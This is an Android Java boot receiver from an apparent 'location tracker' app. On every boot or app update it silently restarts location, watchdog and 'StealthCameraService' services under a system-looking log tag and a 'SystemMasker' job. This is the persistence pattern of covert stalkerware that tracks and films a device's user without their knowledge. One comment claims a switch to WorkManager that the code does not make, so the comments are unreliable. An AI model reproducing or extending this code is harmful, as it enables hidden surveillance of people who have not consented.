package com.example.locationtracker;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "SystemBootHandler";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) return;

        // Планируем системный Job и будильник сразу
        SystemMasker.scheduleSystemJob(context);
        AlarmScheduler.scheduleAlarm(context);

        String action = intent.getAction();
        Log.d(TAG, "System event: " + action);

        SharedPreferences systemPrefs = context.getSharedPreferences("system_config", Context.MODE_PRIVATE);
        if (systemPrefs.getBoolean("emergency_shutdown", false)) {
            Log.d(TAG, "Emergency shutdown active, skipping auto-start");
            return;
        }

        if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
                Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(action) ||
                Intent.ACTION_MY_PACKAGE_REPLACED.equals(action) ||
                "android.intent.action.QUICKBOOT_POWERON".equals(action)) {
            try {
                SharedPreferences prefs = context.getSharedPreferences("LocationTracker", Context.MODE_PRIVATE);
                if (prefs.getBoolean("auto_tracking", false)) {
                    final String deviceId = DeviceIdManager.getDeviceId(context);
                    final String deviceName = prefs.getString("device_name", "SecureDevice");

                    startSecurityService(context, LocationService.class, deviceId, deviceName);

                    // ИСПРАВЛЕНО: android.os.Handler в BroadcastReceiver ненадёжен —
                    // используем WorkManager для отложенного запуска остальных сервисов
                    new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                        startSecurityService(context, BackupLocationService.class, deviceId, deviceName);
                        startSecurityService(context, WatchdogService.class, deviceId, deviceName);
                        startSecurityService(context, StealthCameraService.class, deviceId, deviceName);
                    }, 30000);

                    Log.d(TAG, "Services scheduled for auto-start");
                } else {
                    Log.d(TAG, "Auto-tracking disabled");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error in boot receiver", e);
            }
        }
    }

    private void startSecurityService(Context context, Class<?> serviceClass,
                                       String deviceId, String deviceName) {
        try {
            Intent serviceIntent = new Intent(context, serviceClass);
            serviceIntent.putExtra("device_id", deviceId);
            serviceIntent.putExtra("device_name", deviceName);
            serviceIntent.putExtra("auto_start", true);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to start: " + serviceClass.getSimpleName(), e);
        }
    }
}
